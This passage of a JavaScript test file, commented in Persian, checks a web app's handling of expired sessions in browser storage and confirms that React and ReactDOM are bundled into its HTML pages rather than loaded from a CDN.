  assert.ok(!noPhoto.includes('photo-grid'), 'بدون عکس، بخش عکس هم نباید بیاید');
});

/* ===== رفع ایراد: نشستِ منقضی در localStorage نادیده گرفته نمی‌شد ===== */

test('readStoredSession: نشست منقضی در localStorage نادیده گرفته و پاک می‌شود', async () => {
  const app = await loadApp();
  // isStoredSessionExpired_ همان منطق تصمیم‌گیری‌ست که readStoredSession برای
  // رد/قبول یک نشست ذخیره‌شده به آن تکیه می‌کند؛ مستقیماً سنجیده می‌شود.
  assert.equal(app.isStoredSessionExpired_({ userId: 'u1', sessionExpiresAt: Date.now() - 1000 }), true, 'نشستِ گذشته باید منقضی حساب شود');
  assert.equal(app.isStoredSessionExpired_({ userId: 'u1', sessionExpiresAt: Date.now() + 100000 }), false, 'نشستِ آینده نباید منقضی حساب شود');
  assert.equal(app.isStoredSessionExpired_({ userId: 'u1' }), false, 'نشستِ بدون sessionExpiresAt (قدیمی/آفلاین) نباید منقضی حساب شود');
});

test('readStoredSession: از sessionStorage/localStorage واقعی sandbox می‌خواند و منقضی‌شده را پاک می‌کند', async () => {
  const app = await loadApp();
  // sandbox خودش یک Map مشترک برای sessionStorage/localStorage ساخته (harness بالا)؛
  // این تست مستقیماً همان نمونه را از طریق فراخوانی write/clear/read امتحان می‌کند.
  app.clearStoredSession();
  app.writeStoredSession({ userId: 'u1', username: 'ali', sessionExpiresAt: Date.now() + 100000 });
  assert.ok(app.readStoredSession(), 'نشستِ معتبر باید بازیابی شود');
  app.clearStoredSession();
  assert.equal(app.readStoredSession(), null, 'بعد از پاک‌کردن، چیزی نباید بازیابی شود');
});

/* ===== رفع ایراد: بوت اپ به CDN خارجی برای React/ReactDOM وابسته بود ===== */

test('index.html و deploy/index.html: React/ReactDOM جاسازی شده‌اند، نه از CDN', () => {
  for (const file of [HTML, DEPLOY_HTML]) {
    const html = fs.readFileSync(file, 'utf8');
    assert.equal((html.match(/unpkg\.com\/react/g) || []).length, 0, `${path.basename(file)}: نباید React را از unpkg بگیرد`);
    assert.equal((html.match(/jsdelivr\.net\/npm\/react/g) || []).length, 0, `${path.basename(file)}: نباید ReactDOM را از jsdelivr بگیرد`);
    assert.ok(html.includes('<!--@vendor:react-->'), `${path.basename(file)}: نشانگر جاسازی react باید بماند`);
    assert.ok(html.includes('<!--@vendor:react-dom-->'), `${path.basename(file)}: نشانگر جاسازی react-dom باید بماند`);
  }
});
